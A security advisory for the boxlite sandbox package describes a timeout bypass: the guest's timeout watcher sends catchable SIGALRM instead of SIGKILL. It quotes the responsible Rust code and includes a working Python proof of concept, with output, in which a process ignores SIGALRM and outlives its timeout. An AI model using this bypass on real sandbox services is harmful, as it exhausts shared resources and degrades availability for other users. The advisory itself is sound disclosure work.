@@ -1,0 +1,389 @@
+PYSEC-2026-2400 PyPI/boxlite — BoxLite has a Timeout Bypass Vulnerability
+package: boxlite
+ecosystem: PyPI
+versions affected:
+  >= 0, <= 0.8.2 (ECOSYSTEM)
+aliases: CVE-2026-47213, GHSA-xjhv-pp2r-6f82
+references:
+  https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-xjhv-pp2r-6f82
+  https://nvd.nist.gov/vuln/detail/CVE-2026-47213
+  https://github.com/boxlite-ai/boxlite/commit/28159fc5b6b6fd5037e18a58fc4644c882e3c581
+  https://github.com/boxlite-ai/boxlite
+  https://pypi.org/project/boxlite
+  https://github.com/advisories/GHSA-xjhv-pp2r-6f82
+
+#### Summary
+
+BoxLite is a sandbox service that allows users to create lightweight virtual machines (Boxes) and run OCI containers within them. BoxLite allows users to configure a timeout for services running inside the virtual machine. When the timeout is triggered, BoxLite sends a signal to kill the process. However, instead of using the uncatchable SIGKILL signal, BoxLite uses the catchable SIGALRM signal. Malicious code running inside the sandbox can exploit this vulnerability to continue running after the timeout is triggered, leading to resource exhaustion within the virtual machine and affecting the availability of the BoxLite service.
+
+#### Details
+
+1. ExecRequest with timeout_ms arrives at Execution service
+
+**File:** `guest/src/service/exec/mod.rs` **Function:** `spawn_execution()` (line 315) **Code:**
+
+```rust
+// Step 3: Start timeout watcher (if requested)
+if req.timeout_ms > 0 {
+    timeout::start_timeout_watcher(
+        state,
+        execution_id.clone(),
+        std::time::Duration::from_millis(req.timeout_ms),
+    );
+}
+```
+
+**Issue:** Any nonzero `timeout_ms` triggers the timeout watcher. The host expects this to kill the process after the specified duration.
+
+2. Timeout watcher sends SIGALRM instead of SIGKILL
+
+**File:** `guest/src/service/exec/timeout.rs` **Function:** `start_timeout_watcher()` (line 13) **Code:**
+
+```rust
+pub(super) fn start_timeout_watcher(
+    exec_state: ExecutionState,
+    exec_id: String,
+    timeout: Duration,
+) {
+    tokio::spawn(async move {
+        tokio::time::sleep(timeout).await;
+
+        // Kill process with SIGKILL        ← comment says SIGKILL
+        use nix::sys::signal::Signal;
+        if exec_state.kill(Signal::SIGALRM).await {   // ← but sends SIGALRM
+            info!(execution_id = %exec_id, "killed on timeout");
+        }
+    });
+}
+```
+
+**Issue:** The comment on line 21 explicitly states "Kill process with SIGKILL", but line 23 sends `Signal::SIGALRM`. SIGALRM (signal 14) is the POSIX alarm signal and is catchable/ignorable; SIGKILL (signal 9) cannot be caught or ignored. This is a code error — wrong signal constant used.
+
+3. exec_state.kill() passes the signal through unchanged
+
+**File:** `guest/src/service/exec/state.rs` **Function:** `kill()` (line 325) **Code:**
+
+```rust
+pub async fn kill(&self, signal: nix::sys::signal::Signal) -> bool {
+    let inner = self.inner.lock().await;
+    if let Some(ref handle) = inner.handle {
+        handle.kill(signal).is_ok()
+    } else {
+        false
+    }
+}
+```
+
+**Issue:** No override of the signal — the wrong signal (`SIGALRM`) is delivered directly to the process.
+
+4. ExecHandle.kill() delivers SIGALRM to the process
+
+**File:** `guest/src/service/exec/exec_handle.rs` **Function:** `kill()` (line 335) **Code:**
+
+```rust
+pub fn kill(&self, signal: Signal) -> BoxliteResult<()> {
+    use nix::sys::signal::kill;
+    kill(self.pid, signal).map_err(|e| {
+        BoxliteError::Internal(format!(
+            "Failed to send signal {} to process {}: {}",
+            signal, self.pid, e
+        ))
+    })
+}
+```
+
+**Issue:** Sends SIGALRM (signal 14) to the process. Any process that has registered a custom SIGALRM handler (e.g., via `signal(SIGALRM, handler)`) or set SIGALRM to SIG_IGN will not be terminated.
+
+
+
+As seen from the code, the developer indicated in the comments that SIGKILL should be sent to kill the timed-out process, but SIGALRM was used in the implementation, resulting in the vulnerability.
+
+
+
+#### PoC
+
+1. Install Boxlite following the official tutorial.
+
+2. Run the following Python script:
+
+   ```python
+   #!/usr/bin/env python3
+   """
+   PoC: BoxLite Execution Timeout Bypass via SIGALRM
+   
+   Reproduces the vulnerability described in:
+     "Hunt Report: Exec Timeout Enforcement Bypass via SIGALRM Misuse"
+   
+   Root cause:
+     guest/src/service/exec/timeout.rs sends Signal::SIGALRM (signal 14,
+     catchable/ignorable) instead of Signal::SIGKILL (signal 9, uncatchable).
+   
+   Exploitation:
+     Any process that calls signal(SIGALRM, SIG_IGN) will survive past its
+     configured timeout and run indefinitely.
+   
+   Usage:
+     cd ~/Downloads/boxlite_poc
+     source .venv/bin/activate
+     python3 poc_sigalrm_bypass.py
+   """
+   
+   import asyncio
+   import time
+   
+   import boxlite
+   
+   # -----------------------------------------------------------------------------
+   # Test programs (Python, so no gcc required)
+   # -----------------------------------------------------------------------------
+   
+   # Control: no special signal handling — SIGALRM's default action is termination
+   NORMAL_PROCESS = """
+   import sys, time, os, signal
+   seconds = int(sys.argv[1]) if len(sys.argv) > 1 else 8
+   print(f"PID {os.getpid()}: normal process (default SIGALRM), running for {seconds}s", flush=True)
+   for i in range(1, seconds + 1):
+       time.sleep(1)
+       print(f"PID {os.getpid()}: t+{i}s alive", flush=True)
+   print(f"PID {os.getpid()}: finished", flush=True)
+   """
+   
+   # Exploit: installs SIG_IGN for SIGALRM — one line bypass
+   IGNORE_SIGALRM = """
+   import sys, time, os, signal
+   seconds = int(sys.argv[1]) if len(sys.argv) > 1 else 8
+   signal.signal(signal.SIGALRM, signal.SIG_IGN)   # <-- bypass
+   print(f"PID {os.getpid()}: SIGALRM=SIG_IGN, running for {seconds}s", flush=True)
+   for i in range(1, seconds + 1):
+       time.sleep(1)
+       if i > 3:
+           print(f"PID {os.getpid()}: t+{i}s STILL ALIVE (PAST 3s TIMEOUT!)", flush=True)
+       else:
+           print(f"PID {os.getpid()}: t+{i}s alive", flush=True)
+   print(f"PID {os.getpid()}: WORKLOAD COMPLETE - TIMEOUT WAS BYPASSED", flush=True)
+   """
+   
+   TIMEOUT_S = 3.0   # configured timeout
+   WORKLOAD_S = 8    # process wants to run for 8 seconds
+   
+   
+   # -----------------------------------------------------------------------------
+   # Helper
+   # -----------------------------------------------------------------------------
+   
+   async def run_test(box, name, script, timeout):
+       print(f"\n{'=' * 70}")
+       print(f"TEST: {name}")
+       print(f"  timeout={timeout}s" if timeout else "  timeout=None (disabled)")
+       print(f"{'=' * 70}")
+       t0 = time.time()
+       try:
+           result = await box.exec("python3", "-c", script, str(WORKLOAD_S), timeout=timeout)
+           elapsed = time.time() - t0
+           print(f"  [RESULT] exit_code={result.exit_code}, elapsed={elapsed:.2f}s")
+           print("  [OUTPUT]")
+           for line in result.stdout.strip().splitlines():
+               if line.strip():
+                   print(f"    {line}")
+           return {
+               "elapsed": elapsed,
+               "exit_code": result.exit_code,
+               "timed_out": False,
+               "stdout": result.stdout,
+           }
+       except boxlite.TimeoutError as e:
+           elapsed = time.time() - t0
+           print(f"  [TIMEOUT] BoxLite raised TimeoutError after {elapsed:.2f}s: {e}")
+           return {"elapsed": elapsed, "exit_code": None, "timed_out": True, "stdout": ""}
+       except Exception as e:
+           elapsed = time.time() - t0
+           print(f"  [ERROR] {type(e).__name__}: {e} (elapsed {elapsed:.2f}s)")
+           return {"elapsed": elapsed, "exit_code": None, "timed_out": False, "stdout": ""}
+   
+   
+   # -----------------------------------------------------------------------------
+   # Main
+   # -----------------------------------------------------------------------------
+   
+   async def main():
+       print("BoxLite PoC: Execution Timeout Bypass via SIGALRM")
+       print("=" * 70)
+   
+       async with boxlite.SimpleBox(image="python:3-alpine") as box:
+           print(f"Box started: {box.id}")
+   
+           # Confirm SIGALRM = 14 inside the container
+           r = await box.exec("python3", "-c", "import signal; print(signal.SIGALRM)")
+           print(f"SIGALRM value inside container: {r.stdout.strip()}")
+   
+           # --- Test 1: CONTROL ---
+           r1 = await run_test(
+               box,
+               "CONTROL: Normal process + 3s timeout (default SIGALRM=terminate)",
+               NORMAL_PROCESS,
+               TIMEOUT_S,
+           )
+           await asyncio.sleep(1)
+   
+           # --- Test 2: EXPLOIT ---
+           r2 = await run_test(
+               box,
+               "EXPLOIT: SIGALRM=SIG_IGN + 3s timeout (BYPASS)",
+               IGNORE_SIGALRM,
+               TIMEOUT_S,
+           )
+           await asyncio.sleep(1)
+   
+           # --- Test 3: BASELINE ---
+           r3 = await run_test(
+               box,
+               "BASELINE: Normal process, no timeout (sanity check)",
+               NORMAL_PROCESS,
+               None,
+           )
+   
+           # --- Verdict ---
+           print(f"\n{'=' * 70}")
+           print("VERDICT")
+           print(f"{'=' * 70}")
+           print(f"  CONTROL:  elapsed={r1['elapsed']:.2f}s  exit_code={r1['exit_code']}  timed_out={r1['timed_out']}")
+           print(f"  EXPLOIT:  elapsed={r2['elapsed']:.2f}s  exit_code={r2['exit_code']}  timed_out={r2['timed_out']}")
+           print(f"  BASELINE: elapsed={r3['elapsed']:.2f}s  exit_code={r3['exit_code']}  timed_out={r3['timed_out']}")
+   
+           # exit_code == -14 means killed by signal 14 (SIGALRM), not -9 (SIGKILL)
+           control_killed_by_sigalrm = r1["exit_code"] == -14 and r1["elapsed"] < 5.0
+           exploit_survived          = r2["elapsed"] > 5.0 and r2["exit_code"] == 0
+   
+           print()
+           if control_killed_by_sigalrm:
+               print("  [+] Control process killed by signal 14 (SIGALRM), not signal 9 (SIGKILL)")
+               print("      → confirms timeout watcher sends SIGALRM instead of SIGKILL")
+           if exploit_survived:
+               print(f"  [+] Exploit process ran {r2['elapsed']:.1f}s past {TIMEOUT_S}s timeout, exited normally")
+               print("      → SIGALRM was absorbed by SIG_IGN, timeout completely bypassed")
+   
+           if exploit_survived and control_killed_by_sigalrm:
+               print()
+               print("  *** VULNERABILITY CONFIRMED ***")
+               print(f"  Fix: change Signal::SIGALRM → Signal::SIGKILL in")
+               print(f"       guest/src/service/exec/timeout.rs")
+           elif not exploit_survived:
+               print("  NOT CONFIRMED: exploit process was also terminated at timeout")
+           else:
+               print("  INCONCLUSIVE")
+   
+   
+   if __name__ == "__main__":
+       asyncio.run(main())
+   
+   ```
+
+   Sample output:
+
+   ```
+   $ python3 poc_sigalrm_bypass.py
+   BoxLite PoC: Execution Timeout Bypass via SIGALRM
+   ======================================================================
+   Box started: W0oCKYIWga2t
+   SIGALRM value inside container: 14
+   
+   ======================================================================
+   TEST: CONTROL: Normal process + 3s timeout (default SIGALRM=terminate)
+     timeout=3.0s
+   ======================================================================
+     [RESULT] exit_code=-14, elapsed=3.01s
+     [OUTPUT]
+       PID 3: normal process (default SIGALRM), running for 8s
+       PID 3: t+1s alive
+       PID 3: t+2s alive
+   
+   ======================================================================
+   TEST: EXPLOIT: SIGALRM=SIG_IGN + 3s timeout (BYPASS)
+     timeout=3.0s
+   ======================================================================
+     [RESULT] exit_code=0, elapsed=8.14s
+     [OUTPUT]
+       PID 4: SIGALRM=SIG_IGN, running for 8s
+       PID 4: t+1s alive
+       PID 4: t+2s alive
+       PID 4: t+3s alive
+       PID 4: t+4s STILL ALIVE (PAST 3s TIMEOUT!)
+       PID 4: t+5s STILL ALIVE (PAST 3s TIMEOUT!)
+       PID 4: t+6s STILL ALIVE (PAST 3s TIMEOUT!)
+       PID 4: t+7s STILL ALIVE (PAST 3s TIMEOUT!)
+       PID 4: t+8s STILL ALIVE (PAST 3s TIMEOUT!)
+       PID 4: WORKLOAD COMPLETE - TIMEOUT WAS BYPASSED
+   
+   ======================================================================
+   TEST: BASELINE: Normal process, no timeout (sanity check)
+     timeout=None (disabled)
+   ======================================================================
+     [RESULT] exit_code=0, elapsed=8.09s
+     [OUTPUT]
+       PID 5: normal process (default SIGALRM), running for 8s
+       PID 5: t+1s alive
+       PID 5: t+2s alive
+       PID 5: t+3s alive
+       PID 5: t+4s alive
+       PID 5: t+5s alive
+       PID 5: t+6s alive
+       PID 5: t+7s alive
+       PID 5: t+8s alive
+       PID 5: finished
+   
+   ======================================================================
+   VERDICT
+   ======================================================================
+     CONTROL:  elapsed=3.01s  exit_code=-14  timed_out=False
+     EXPLOIT:  elapsed=8.14s  exit_code=0  timed_out=False
+     BASELINE: elapsed=8.09s  exit_code=0  timed_out=False
+   
+     [+] Control process killed by signal 14 (SIGALRM), not signal 9 (SIGKILL)
+         → confirms timeout watcher sends SIGALRM instead of SIGKILL
+     [+] Exploit process ran 8.1s past 3.0s timeout, exited normally
+         → SIGALRM was absorbed by SIG_IGN, timeout completely bypassed
+   
+     *** VULNERABILITY CONFIRMED ***
+     Fix: change Signal::SIGALRM → Signal::SIGKILL in
+          guest/src/service/exec/timeout.rs
+   ```
+
+   As shown in the output, after catching the SIGALRM signal, the process can continue running, bypassing the timeout restriction.
+
+
+
+#### Impact
+
+Malicious code running inside the sandbox can exploit this vulnerability to continue running after the timeout is triggered, leading to resource exhaustion within the virtual machine and affecting the availability of the BoxLite service.
+
+
+
+#### Score
+
+Severity: Medium, Score: 6.5, rationale as follows:
+
+- AV:N — Can be triggered by submitting code via the network API
+- AC:L — No complex exploitation required; catching the signal is sufficient to bypass
+- PR:L — The attacker does not need special privileges
+- UI:N — The attacker does not need to interact with the victim
+- S:U — This vulnerability only affects the sandbox internals and does not change the scope
+- C:N/I:N/A:H — This vulnerability only affects availability, not confidentiality or integrity
+
+
+
+#### Credit
+
+This vulnerability was discovered by:
+
+- XlabAI Team of Tencent Xuanwu Lab
+- Atuin Automated Vulnerability Discovery Engine
+
+CVE and credit are preferred.
+
+If there are any questions regarding the vulnerability details, please feel free to reach out to Tencent Xuanwu Lab for further discussion by emailing xlabai@tencent.com.
+
+
+
+#### Note
+
+Note that the organization follows the industry-standard **90+30 disclosure policy** (Reference: https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html). This means that the organization reserves the right to disclose the details of the vulnerability 30 days after the fix has been implemented.
